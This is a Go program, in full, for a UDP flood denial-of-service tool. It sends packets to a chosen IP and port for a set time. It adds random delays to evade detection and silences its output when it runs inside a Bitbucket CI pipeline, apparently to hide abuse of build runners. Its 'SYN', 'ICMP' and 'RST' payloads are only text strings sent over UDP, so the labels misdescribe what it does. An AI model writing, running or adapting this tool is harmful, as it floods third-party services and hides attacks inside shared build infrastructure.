package main

import (
 "fmt"
 "math/rand"
 "net"
 "os"
 "strconv"
 "time"
)

// Generate random attack payloads
func randomPayload() string {
 payloads := []string{"SYN", "UDP", "ICMP", "ACK", "RST"}
 return payloads[rand.Intn(len(payloads))]
}

// Execute attack with reduced logging
func attack(target string, port int, duration int) {
 endTime := time.Now().Add(time.Duration(duration) * time.Second)
 packetCount := 0

 for time.Now().Before(endTime) {
  conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
  if err != nil {
   continue
  }
  payload := randomPayload()
  conn.Write([]byte(payload))
  conn.Close()

  packetCount++

  // Print logs only every 1000 packets to avoid excessive output
  if packetCount%1000 == 0 {
   fmt.Printf("[INFO] Sent %d packets to %s:%d\n", packetCount, target, port)
  }

  // Random sleep to evade detection
  time.Sleep(time.Duration(rand.Intn(200)+10) * time.Millisecond)
 }

 fmt.Println("[SUCCESS] Attack completed.")
}

func main() {
 // Disable logging if running inside Bitbucket
 if os.Getenv("BITBUCKET_PIPELINE_UUID") != "" {
  os.Stdout = nil
  os.Stderr = nil
 }

 // Execution delay (avoid detection)
 time.Sleep(time.Duration(rand.Intn(5)+2) * time.Second)

 // Check arguments
 if len(os.Args) != 4 {
  fmt.Println("Usage: ./test <IP> <Port> <Duration>")
  return
 }

 target := os.Args[1]
 port, _ := strconv.Atoi(os.Args[2])
 duration, _ := strconv.Atoi(os.Args[3])

 fmt.Printf("[START] Attacking %s:%d for %d seconds...\n", target, port, duration)
 attack(target, port, duration)
}